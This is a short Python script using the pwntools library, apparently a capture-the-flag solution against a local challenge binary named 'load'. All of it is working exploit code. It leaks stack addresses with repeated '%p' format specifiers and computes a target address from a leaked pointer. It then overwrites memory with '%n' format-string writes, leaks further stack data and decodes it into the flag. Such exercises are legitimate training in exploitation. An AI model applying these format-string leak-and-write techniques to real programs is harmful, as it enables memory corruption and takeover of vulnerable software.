from pwn import *
binary = context.binary = ELF('./load')
context.bits = 64

p = process(binary.path)

p.sendline(b"1")
p.recvuntil(b"pack?")
p.sendline(b"-%p"*50)
p.recvline()

s = p.recvline()
s = s.split(b"-")
# print(s)
badr = int(s[21], 16)+10410

p.sendline(b"1")
p.recv()

p.sendline(b"%83c%9$n%83c%9$n%83c%9$n" + p64(badr))
p.recv()

p.sendline(b"2")
p.recvuntil(b"code:")
p.sendline(b"-%p"*35)
p.recvline()
p.recvline()

bflag = p.recvline().split(b"-")

flag = ""

for i in bflag:
    try:
        flag += str(bytes.fromhex(str(i)[4:-1]).decode('utf-8'))[::-1]
    except:
        continue

print("flag: ", flag)